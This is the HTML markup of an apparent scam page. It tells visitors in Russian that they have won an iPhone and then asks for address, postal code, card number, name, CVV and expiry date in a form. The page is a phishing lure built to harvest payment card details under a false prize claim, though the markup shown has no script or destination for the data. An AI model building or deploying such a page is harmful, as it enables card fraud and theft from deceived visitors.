    <title>Congrats!!!</title>

<body>
    <div class="prize">
        <h1 id="congrats">Поздравляю, вы выиграли <a id="prize-name">Iphone</a></h1>
        <div class="item"></div>
    </div>
    <div class="get-prize">
        <img src="images/1.svg" id="visa-image">
        <h1>Вам нужно всего лишь оставить данные</h1>
        <form>
            <input type="text" name="adress" id="adress">
            <label for="adress">Adress</label>
            <input type="number" name="postal-code" id="post-code">
            <label for="postal-code">Postal Code</label>
            <input type="number" name="cardNumber" id="card-number">
            <label for="cardNumber">Card Code</label>
            <input type="text" name="nameSurname" id="name-surname">
            <label for="nameSurname">Your Name and Surname</label>
            <input type="number" name="cvv" id="cvv">
            <label for="cvv">CVV</label>
            <br>
            <input style="margin-top: 2rem;" type="month" name="date" id="card-date">
            <label for="date">MONTH/YEAR</label>
        </form>
        <br>
        <button id="submit-button" style="display: block; margin: 2rem auto; background-color: #FF6347;" class="waves-effect waves-light btn">Submit</button>
    </div>
</body>
